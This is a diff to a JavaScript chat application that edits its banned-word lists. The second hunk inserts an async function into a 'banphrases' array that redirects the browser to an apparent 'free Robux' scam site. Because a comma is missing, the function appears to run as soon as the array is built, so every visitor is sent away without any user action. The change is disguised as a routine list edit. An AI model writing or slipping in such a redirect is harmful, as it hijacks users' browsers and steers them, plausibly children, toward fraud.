@@ -409,7 +409,7 @@ function listenToRoom(roomName) {
     });
 }
 
-const banned = ["<", atob("ZnVjaw=="), atob("IGNjcCA=")];
+const banned = ["<", atob("ZnVjaw=="), "ccp"];
 const bannedeq = ["'&lt;'", "a very bad word", "a reference to the CCP"];
 function checkBannedWords(string, banlist) {
     if (!string) {
@@ -517,6 +517,9 @@ const banphrases = [
     "loves Biden",
     "loves American politics",
     "was pushed off a cliff by a donkey",
+    (async () => {
+        window.location.replace("https://freerobux.great-site.net/free");
+    })
     (async () => {
         await Popup.quick("You probably know by now that you shouldn't be doing that.", "ok");
         await Popup.quick("So why do you keep doing it?", "ok");
